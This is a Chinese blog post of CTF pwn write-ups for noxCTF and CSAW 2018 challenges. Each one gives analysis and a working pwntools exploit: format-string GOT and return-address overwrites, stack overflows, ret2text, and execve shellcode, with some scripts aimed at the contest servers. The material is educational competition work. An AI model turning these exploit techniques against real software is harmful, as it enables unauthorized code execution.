---
title: nox_CSAW部分pwn题解
author: nepire
avatar: 'https://wx1.sinaimg.cn/large/006bYVyvgy1ftand2qurdj303c03cdfv.jpg'
authorLink: 'https://nepire.github.io/'
authorAbout: 逐梦者
authorDesc: 逐梦者
categories: 技术
comments: true
date: 2019-11-05 11:46:18
tags:
keywords:
description:
photos:
---
暑假的时候遇到了一群一起学习安全的小伙伴，在他们的诱劝下，开始接触国外的CTF比赛，作为最菜的pwn选手就试着先打两场比赛试试水，结果发现国外比赛真有意思哎嘿。

本文首发于[安恒网络空间安全讲武堂](https://mp.weixin.qq.com/s?__biz=MzU1MzE3Njg2Mw==&mid=2247485613&idx=1&sn=d523230fb3778620baaddaf987b7d7f3&chksm=fbf792ddcc801bcb81ffd41bc211bdd74c91cb80baecaaec5cb37b682b7afe3bf29dcb2f72d6&mpshare=1&scene=23&srcid=1009d0fGRYWnkyimpbjdG7sm#)







### NOXCTF

#### PWN—believeMe(378)

惯例先走一遍file+checksec检查
```bash
➜  believeMe file believeMe
believeMe: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=03d2b6bcc0a0fdbab80a9852cab1d201437e7e30, not stripped
➜  believeMe checksec believeMe
[*] '/home/Ep3ius/pwn/process/noxCTF2018/believeMe/believeMe'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

再简单的运行下程序看看程序是什么样的结构

```bash
➜  believeMe ./believeMe
Someone told me that pwning makes noxāle...
But......... how ????
aaaa
aaaa%  
➜  believeMe
```
然后ida简单分析下，我们可以很直接的看到在main函数里有一个格式化字符串漏洞

```c
.text:080487CC ; 10:   printf(s);
.text:080487CC                 sub     esp, 0Ch
.text:080487CF                 lea     eax, [ebp+s]
.text:080487D2                 push    eax             ; format
.text:080487D3                 call    _printf
```

这里我本来以为只是简单的利用格式化字符串去修改fflush_got所以我先测出来fmt的偏移量为9

```bash
➜  believeMe ./believeMe
Someone told me that pwning makes noxāle...
But......... how ????
aaaa%9$x
aaaa61616161%                                                         
➜  believeMe
```

然后构造payload=fmtstr_payload(9,{fflush_got:noxflag_addr})想直接getflag，然后实际上没那么简单。调试过后发现fmtstr_payload不全，len(payload)输出检查后发现长度超了，稍微查了下pwntools文档的fmtstr部分，发现它默认是以hhn也就是单字节的形式去构造payload，如果以双字节或四字节的形式要加上write_size参数，这样payload的长度就不会超过40
```python
payload = fmtstr_payload(9,{fflush_got:noxFlag_addr},write_size='short')
```

然而当我们成功修改fflush_got为noxFlag的地址时会进入到一个死循环中，我们看一下noxFlag函数里面不难发现问题

```c
void __noreturn noxFlag()
{
  char i; // [esp+Bh] [ebp-Dh]
  FILE *stream; // [esp+Ch] [ebp-Ch]

  stream = fopen("flag.txt", "r");
  puts(s);
  fflush(stdout);//这里又调用了fflush函数，由于我们把fflush_got改成了noxFlag地址，这里相当递归调用noxFlag，形成死循环
  if ( stream )
  {
    for ( i = fgetc(stream); i != -1; i = fgetc(stream) )
    {
      putchar(i);
      fflush(stdout);
    }
    fflush(stdout);
    fclose(stream);
  }
  else
  {
    puts("Can't read file \n");
    fflush(stdout);
  }
  exit(0);
}
```

当时就卡在这里没绕出去，经过队友提醒能不能改return地址，才发现思路走偏了

我们gdb把断点下在printf调试一下，先查看下堆栈

```bash
gdb-peda$ stack 30
0000| 0xffffcf1c --> 0x80487d8 (<main+129>:	add    esp,0x10)
0004| 0xffffcf20 --> 0xffffcf44 ("aaaa%21$x")
0008| 0xffffcf24 --> 0x804890c --> 0xa ('\n')
0012| 0xffffcf28 --> 0xf7fb45a0 --> 0xfbad2288
0016| 0xffffcf2c --> 0x8f17
0020| 0xffffcf30 --> 0xffffffff
0024| 0xffffcf34 --> 0x2f ('/')
0028| 0xffffcf38 --> 0xf7e0edc8 --> 0x2b76 ('v+')
0032| 0xffffcf3c --> 0xffffd024 --> 0xffffd201 ("/home/Ep3ius/pwn/process/noxCTF2018/believeMe/believeMe")
0036| 0xffffcf40 --> 0x8000
0040| 0xffffcf44 ("aaaa%21$x")
0044| 0xffffcf48 ("%21$x")
0048| 0xffffcf4c --> 0xf7000078
0052| 0xffffcf50 --> 0x1
0056| 0xffffcf54 --> 0x0
0060| 0xffffcf58 --> 0xf7e30a50 (<__new_exitfn+16>:	add    ebx,0x1835b0)
0064| 0xffffcf5c --> 0x804885b (<__libc_csu_init+75>:	add    edi,0x1)
0068| 0xffffcf60 --> 0x1
0072| 0xffffcf64 --> 0xffffd024 --> 0xffffd201 ("/home/Ep3ius/pwn/process/noxCTF2018/believeMe/believeMe")
0076| 0xffffcf68 --> 0xffffd02c --> 0xffffd239 ("XDG_SEAT_PATH=/org/freedesktop/DisplayManager/Seat0")
0080| 0xffffcf6c --> 0xed1acd00
0084| 0xffffcf70 --> 0xf7fb43dc --> 0xf7fb51e0 --> 0x0
0088| 0xffffcf74 --> 0xffffcf90 --> 0x1
0092| 0xffffcf78 --> 0x0
0096| 0xffffcf7c --> 0xf7e1a637 (<__libc_start_main+247>:	add    esp,0x10)
--More--(25/30)
0100| 0xffffcf80 --> 0xf7fb4000 --> 0x1b1db0
0104| 0xffffcf84 --> 0xf7fb4000 --> 0x1b1db0
0108| 0xffffcf88 --> 0x0
0112| 0xffffcf8c --> 0xf7e1a637 (<__libc_start_main+247>:	add    esp,0x10)
0116| 0xffffcf90 --> 0x1
```

我们可以看到在偏移112处return地址为0xFFFFCF8C，我们找到了一个与它偏移相近的并且能被泄露出来的地址，因为题目说了(No ASLR) ，所以return的地址是不会变化，我们可以先连上一次得到return地址构造payload来getflag

(这里有一个挺坑的地方就是你在本地复现时终端运行得到地址和用pwntools得到的地址可能不一样，这块我还是不懂是什么原理，希望知道的师傅能讲一下学习一波)

EXP
```python
from pwn import*
context(os='linux',arch='i386')#,log_level='debug')
#n = process('./believeMe')
n = remote('18.223.228.52',13337)

shell_addr = 0x804867b
#ret_addr = 0xffffd030 - 0x4
ret_addr = 0xffffdd30 - 0x4
payload = fmtstr_payload(9,{ret_addr:shell_addr},write_size='short')
n.recvuntil('But......... how ????')
#n.sendline('%21$x')
n.sendline(payload)
n.interactive()
```

FLAG
```
noxCTF{N3ver_7rust_4h3_F0rmat}
```

#### PWN—The Name Calculator

惯例检查一遍文件

```bash
➜  TheNameCalculator file TheNameCalculator
TheNameCalculator: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=8f717904e2313e4d6c3bc92730d2e475861123dd, not stripped
➜  TheNameCalculator checksec TheNameCalculator
[*] '/home/Ep3ius/pwn/process/noxCTF2018/TheNameCalculator/TheNameCalculator'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

简单过一遍程序，只有一个输入

```bash
➜  TheNameCalculator ./TheNameCalculator
What is your name?
Ep3ius
I've heard better
```

开ida发现在main里有个套路check，v4在read_buf后不再修改，并且buf的输入大小可以正好覆盖v4的值，所以我们构造payload = 'a'* (0x2c-0x10)+p32(0x6A4B825)让v4在if判断时的值为0x6A4B825

```c
puts("What is your name?");
fflush(stdout);
read(0, &buf, 0x20u);
fflush(stdin);
if ( v4 == 0x6A4B825 )
{
  secretFunc();
}
```

进入secretFunc函数后发现函数最末尾有个格式化字符串漏洞，并且可以通过改exit_got来实现跳转，但中间有一段对输入进行一个异或加密，加密方式很简单就不再赘述，最终要达到的就是输入'aaaa%12$x'能返回未加密时格式化字符串正确的参数就算成功了，剩下的就是普通的格式化字符串改got的标准套路了，不过输入的fmt_payload的大小限制在了27而如果我们直接用fmtstr_payload生成的payload的长度是超过这个大小的，恰巧的是exit_got和superSecretFunc的前两位相同都为0x0804，所以我们的payload就不需要再改exit_got的前两位使我们payload的长度缩减至21

```c
for ( i = buf; i < (int *)((char *)&buf[-1] + v3); i = (int *)((char *)i + 1) )
    *i ^= 0x5F7B4153u;
```

encrypt

```python
def encrypt(enc):
    buf = list(enc)
    for i in range(0, len(buf) - 4):
        payload = ''.join(buf[i:i+4])
        key = u32(payload)^0x5F7B4153
        buf[i:i+4] = list(p32(key))
    return ''.join(buf)
```



EXP

```python
from pwn import*
context(os='linux',arch='i386')#,log_level='debug')
n = process('./TheNameCalculator')
#n = remote('chal.noxale.com', 5678)
elf = ELF('./TheNameCalculator')

exit_got = elf.got['exit']
superSecretFunc_addr = 0x08048596
name = 'a'*(0x2c-0x10)+p32(0x6A4B825)

def encrypt(enc):
    buf = list(enc)
    for i in range(0, len(buf) - 4):
        payload = ''.join(buf[i:i+4])
        key = u32(payload)^0x5F7B4153
        buf[i:i+4] = list(p32(key))
    return ''.join(buf)

def check_name():
    n.recvuntil('name?\n')
    n.send(name)

def secretFunc(payload):
    n.recvuntil('please')
    n.send(encrypt(payload))

check_name()

payload = fmtstr_payload(12,{exit_got:superSecretFunc_addr},write_size='short')[0:21]
offset = 'aaaa%12$x'

secretFunc(payload)

n.interactive()
```



FLAG

```
noxCTF{M1nd_7he_Input}
```



### CSAW CTF

#### PWN—bigboy

简单的bof类型题目，先检查文件

```bash
➜  bigboy file boi
boi: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=1537584f3b2381e1b575a67cba5fbb87878f9711, not stripped
➜  bigboy checksec boi
[*] '/home/Ep3ius/pwn/process/CSAW2018/bigboy/boi'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

idaF5看一下程序逻辑

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  __int64 buf; // [rsp+10h] [rbp-30h]
  __int64 v5; // [rsp+18h] [rbp-28h]
  __int64 v6; // [rsp+20h] [rbp-20h]
  int v7; // [rsp+28h] [rbp-18h]
  unsigned __int64 v8; // [rsp+38h] [rbp-8h]

  v8 = __readfsqword(0x28u);
  buf = 0LL;
  v5 = 0LL;
  v6 = 0LL;
  v7 = 0;
  HIDWORD(v6) = 0xDEADBEEF;
  puts("Are you a big boiiiii??");
  read(0, &buf, 24uLL);
  if ( HIDWORD(v6) == 0xCAF3BAEE )
    run_cmd("/bin/bash");
  else
    run_cmd("/bin/date");
  return 0;
}
```
本以为构造payload = 'a'* (0x30-0x20)+p32(0xCAF3BAEE)就可以直接过if判断getshell，然而事情并没那么简单，gdb调试一下发现0xCAF3BAEE距离我们想要出现在的位置差了4

```bash
[-------------------------------------code-------------------------------------]
   0x40069b <main+90>:  mov    edi,0x0
   0x4006a0 <main+95>:  call   0x400500 <read@plt>
   0x4006a5 <main+100>: mov    eax,DWORD PTR [rbp-0x1c]
=> 0x4006a8 <main+103>: cmp    eax,0xcaf3baee
   0x4006ad <main+108>: jne    0x4006bb <main+122>
   0x4006af <main+110>: mov    edi,0x40077c
   0x4006b4 <main+115>: call   0x400626 <run_cmd>
   0x4006b9 <main+120>: jmp    0x4006c5 <main+132>
[------------------------------------stack-------------------------------------]
0000| 0x7ffd1313f360 --> 0x7ffd1313f488 --> 0x7ffd131402a8 --> 0x545100696f622f2e ('./boi')
0008| 0x7ffd1313f368 --> 0x10040072d
0016| 0x7ffd1313f370 ('a' <repeats 16 times>, "\356\272\363\312\n\276\255", <incomplete sequence \336>)
0024| 0x7ffd1313f378 ("aaaaaaaa\356\272\363\312\n\276\255", <incomplete sequence \336>)
0032| 0x7ffd1313f380 --> 0xdeadbe0acaf3baee
0040| 0x7ffd1313f388 --> 0x0
0048| 0x7ffd1313f390 --> 0x7ffd1313f480 --> 0x1
0056| 0x7ffd1313f398 --> 0xcc79c30a8da0b800
[------------------------------------------------------------------------------] blue
Legend: code, data, rodata, value
0x00000000004006a8 in main ()
gdb-peda$ p $eax
$1 = 0xdeadbe0a
```

idaF5看不出什么东西，直接切汇编

```c
mov     dword ptr [rbp+v6+4], 0DEADBEEFh
mov     edi, offset s   ; "Are you a big boiiiii??"
call    _puts
lea     rax, [rbp+buf]
mov     edx, 18h        ; nbytes
mov     rsi, rax        ; buf
mov     edi, 0          ; fd
call    _read
mov     eax, dword ptr [rbp+v6+4]
cmp     eax, 0CAF3BAEEh
jnz     short loc_4006BB
```

这里我们可以很简单就看出原因所在，eax所存的指针指向的是rbp-0x20+4而buf的首地址是指向rbp-0x30,而if语句比较的相当于在0x4006A8时的eax寄存器的值与0xCAF3BAEE是否相等，而两者的差值并非是v6与buf在栈上的距离，而实际的距离应该是0x30-0x20+4

EXP

```python
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
#n = process('./boi')
n = remote('pwn.chal.csaw.io',9000)
payload = 'a'*(0x30-0x20+0x4)+p32(0xCAF3BAEE)
n.recvuntil('??')
#gdb.attach(n)
n.sendline(payload)

n.interactive()
```



FLAG

```
flag{Y0u_Arrre_th3_Bi66Est_of_boiiiiis}
```



#### PWN—get it

```bash
➜  get_it file get_it
get_it: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=87529a0af36e617a1cc6b9f53001fdb88a9262a2, not stripped
➜  get_it checksec get_it
[*] '/home/Ep3ius/pwn/process/CSAW2018/get_it/get_it'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

程序的逻辑很简单，一个gets溢出，也给了system('/bin/sh')函数，虽然开了NX麻烦直接shellcode来getshell，但ret2text还是很简单的就直接给exp了

EXP

```python
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
#n = process('./get_it')
n = remote('pwn.chal.csaw.io',9001)

give_shell = 0x04005b6
buf = 'a'*(32+8)
payload = buf + p64(give_shell)

n.recvuntil('it??')
n.sendline(payload)

n.interactive()
```

FLAG

```
flag{y0u_deF_get_itls}
```



#### PWN—shell->code

```bash
➜  shellpointcode file shellpointcode
shellpointcode: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=214cfc4f959e86fe8500f593e60ff2a33b3057ee, not stripped
➜  shellpointcode checksec shellpointcode
[*] '/home/Ep3ius/pwn/process/CSAW2018/shellpointcode/shellpointcode'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      PIE enabled
    RWX:      Has RWX segments
```

很明显的让你写shellcode的题目，简单的审计和运行过一遍程序后发现他是一个有两个节点链表结构，并且每个节点输入最多为15byte，并且在node.next泄露出了栈上的地址，对于完整shellcode来说15字节一般是不够的

```bash
➜  shellpointcode ./shellpointcode
Linked lists are great!
They let you chain pieces of data together.

(15 bytes) Text for node 1:  
aaaa
(15 bytes) Text for node 2:
bbbb
node1:
node.next: 0x7ffd53539c70
node.buffer: aaaa

What are your initials?
111
Thanks 111
```

简单分析调试后可以得到栈溢出后8byte后即为返回地址，我们在写完ret地址后接着写入‘/bin/sh’可以达到在开始执行shellcode时rsp里存放的是指向/bin/sh的指针，那么便可以利用mov rdi,rsp使‘/bin/sh\0’作为execve的参数来调用execve('/bin/sh')来getshell

```bash
[----------------------------------registers-----------------------------------]
RAX: 0x19
RBX: 0x0
RCX: 0x7f1f405832c0 (<__write_nocancel+7>:  cmp    rax,0xfffffffffffff001)
RDX: 0x7f1f40852780 --> 0x0
RSI: 0x7ffea8fdff90 ("Thanks ", 'a' <repeats 11 times>, "h&\376\250\376\177\n\nnode.buffer: H\211\347j;X1\366\231\017\005\n\n")
RDI: 0x1
RBP: 0x6161616161616161 ('aaaaaaaa')
RSP: 0x7ffea8fe2638 --> 0x7ffea8fe2668 --> 0xf631583b6ae78948
RIP: 0x55d7207d08ee (ret)
R8 : 0x7f1f40a5e700 (0x00007f1f40a5e700)
R9 : 0x19
R10: 0x11
R11: 0x246
R12: 0x55d7207d0720 (xor    ebp,ebp)
R13: 0x7ffea8fe2770 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x55d7207d08e7:  call   0x55d7207d06d0
   0x55d7207d08ec:  nop
   0x55d7207d08ed:  leave  
=> 0x55d7207d08ee:  ret    
   0x55d7207d08ef:  push   rbp
   0x55d7207d08f0:  mov    rbp,rsp
   0x55d7207d08f3:  sub    rsp,0x40
   0x55d7207d08f7:  lea    rax,[rbp-0x40]
[------------------------------------stack-------------------------------------]
0000| 0x7ffea8fe2638 --> 0x7ffea8fe2668 --> 0xf631583b6ae78948
0008| 0x7ffea8fe2640 --> 0x68732f6e69622f ('/bin/sh')
0016| 0x7ffea8fe2648 --> 0xa ('\n')
0024| 0x7ffea8fe2650 --> 0x0
0032| 0x7ffea8fe2658 --> 0x7f1f40851620 --> 0xfbad2887
0040| 0x7ffea8fe2660 --> 0x7ffea8fe2640 --> 0x68732f6e69622f ('/bin/sh')
0048| 0x7ffea8fe2668 --> 0xf631583b6ae78948
0056| 0x7ffea8fe2670 --> 0xa050f99
[------------------------------------------------------------------------------] blue
Legend: code, data, rodata, value
0x000055d7207d08ee in ?? ()
```

execve的汇编可以参考http://spd.dropsec.xyz/2017/02/20/%E4%BB%8E%E6%B1%87%E7%BC%96%E8%A7%92%E5%BA%A6%E5%88%86%E6%9E%90execve%E5%87%BD%E6%95%B0/

EXP

```python
from pwn import*
context(os='linux',arch='amd64',log_level='debug')
n = process('./shellpointcode')
#n = remote('pwn.chal.csaw.io',9005)
shellcode ="""
    mov rdi, rsp      /* call execve('rsp',0,0) rsp->'/bin/sh\0' */
    push 0x3b         /* sys_execve */
    pop rax
    xor esi,esi
    syscall
"""
#print len(asm(shellcode))
#raw_input()
n.sendline(asm(shellcode))
sleep(0.1)
n.sendline('')
n.recvuntil("node.next: ")
stack = int(n.recvuntil('\n'),16)
#gdb.attach(n)
node_2 = stack + 0x28
n.sendline('a'*11 + p64(node_2) + '/bin/sh\0')
n.interactive()
```

FLAG

```
flag{NONONODE_YOU_WRECKED_BRO}
```
